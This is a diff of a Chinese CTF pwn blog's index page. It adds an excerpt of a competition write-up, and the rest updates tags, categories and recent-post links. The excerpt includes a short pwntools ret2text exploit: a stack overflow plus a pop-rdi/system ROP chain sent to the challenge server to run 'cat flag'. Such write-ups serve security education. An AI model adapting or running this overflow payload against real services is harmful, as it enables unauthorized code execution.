@@ -134,6 +134,34 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/2024YLCTF-1/" title="ROUND1">『YLCTF 源鲁杯 2024』 PWN-1 WP</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-10-12  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x00-giaopwn"><a href="#0x00-giaopwn" class="headerlink" title="0x00 giaopwn"></a>0x00 giaopwn</h2><p>ret2text，没什么好讲的。有个cat flag的字符串，直接用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">41537</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400743</span></span><br><span class="line">flag = <span class="number">0x601048</span></span><br><span class="line">system = <span class="number">0x4006D2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(flag)+p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2024/2024YLCTF-1/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/protobuf-install/" title="自从国赛遇到protobuf题目之后就一直想好好研究一下，最近才学习其用法。">protobuf pwn题环境配置及基础操作</a>
 		</h3>
 		</div>
@@ -381,34 +409,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/ret2dl-hijack-l-addr/" title="ret2dlresolve之劫持l_addr">『ret2dlresolve』hijack l_addr(GeekCTF2024 Memo2)</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-06-25  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>本来这篇文章想5月份写的，拖到了现在。其实是之前在VN面试的时候Qanux师傅给我做的几道题里的其中一道要用到这个技术，也是第一次见，所以打算记录一下。后来题目做了三天，才发现是24年geekCTF的memo2。接下来就从这道题讲讲劫持l_addr绕过栈溢出检测或者getshell的思路，以及调试方法。</p>
-<h3 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h3>
-	
-	</div>
-  <a type="button" href="/2024/ret2dl-hijack-l-addr/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
 
 		</div>
 
@@ -458,7 +458,7 @@
 		
 			<li><a href="/categories/Heap-Exploitation/">Heap Exploitation<span>3</span></a></li>
 		
-			<li><a href="/categories/WP/">WP<span>14</span></a></li>
+			<li><a href="/categories/WP/">WP<span>15</span></a></li>
 		
 			<li><a href="/categories/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
 		
@@ -493,45 +493,45 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/hexagon/">hexagon<span>2</span></a></li>
-		
 			<li><a href="/tags/protobuf/">protobuf<span>2</span></a></li>
 		
-			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
-		
-			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
-		
-			<li><a href="/tags/llvm/">llvm<span>2</span></a></li>
-		
-			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+			<li><a href="/tags/WP/">WP<span>19</span></a></li>
 		
 			<li><a href="/tags/exit-hook/">exit_hook<span>2</span></a></li>
 		
-			<li><a href="/tags/BUU/">BUU<span>1</span></a></li>
+			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
 		
 			<li><a href="/tags/计组/">计组<span>4</span></a></li>
 		
 			<li><a href="/tags/libc-got/">libc_got<span>1</span></a></li>
 		
-			<li><a href="/tags/docker/">docker<span>1</span></a></li>
+			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+		
+			<li><a href="/tags/diary/">diary<span>14</span></a></li>
+		
+			<li><a href="/tags/PWN/">PWN<span>30</span></a></li>
 		
 			<li><a href="/tags/heap/">heap<span>6</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>25</span></a></li>
+			<li><a href="/tags/BUU/">BUU<span>1</span></a></li>
 		
-			<li><a href="/tags/图灵完备/">图灵完备<span>4</span></a></li>
+			<li><a href="/tags/llvm/">llvm<span>2</span></a></li>
 		
-			<li><a href="/tags/magic-gadget/">magic_gadget<span>1</span></a></li>
+			<li><a href="/tags/docker/">docker<span>1</span></a></li>
 		
-			<li><a href="/tags/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>26</span></a></li>
 		
-			<li><a href="/tags/PWN/">PWN<span>29</span></a></li>
-		
-			<li><a href="/tags/WP/">WP<span>18</span></a></li>
+			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
 		
 			<li><a href="/tags/编译原理/">编译原理<span>1</span></a></li>
 		
-			<li><a href="/tags/diary/">diary<span>14</span></a></li>
+			<li><a href="/tags/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
+		
+			<li><a href="/tags/magic-gadget/">magic_gadget<span>1</span></a></li>
+		
+			<li><a href="/tags/图灵完备/">图灵完备<span>4</span></a></li>
+		
+			<li><a href="/tags/hexagon/">hexagon<span>3</span></a></li>
 		
 		 
 		</ul>
@@ -543,6 +543,10 @@
 <div class="widget">
   <h4>最新文章</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2025/2025vnctf-hexagon/" ><i class="fa fa-file-o"></i>『2025VNCTF』hexagon出题小记&amp;&amp;hex...</a>
+      </li>
     
       <li>
         <a href="/2024/hexagon-toolchain-env/"  title="波折的，hexagon架构LLVM编译环境搭建" ><i class="fa fa-file-o"></i>hexagon LLVM编译环境搭建</a>
@@ -558,10 +562,6 @@
     
       <li>
         <a href="/2024/first-llvm-pass-pwn/"  title="llvm pass pwn 入门" ><i class="fa fa-file-o"></i>llvm pass pwn 入门</a>
-      </li>
-    
-      <li>
-        <a href="/2024/2024xsctf-QQbot-wp/"  title="出题记录兼WP" ><i class="fa fa-file-o"></i>2024XSCTF初赛QQbot出题小记</a>
       </li>
     
   </ul>
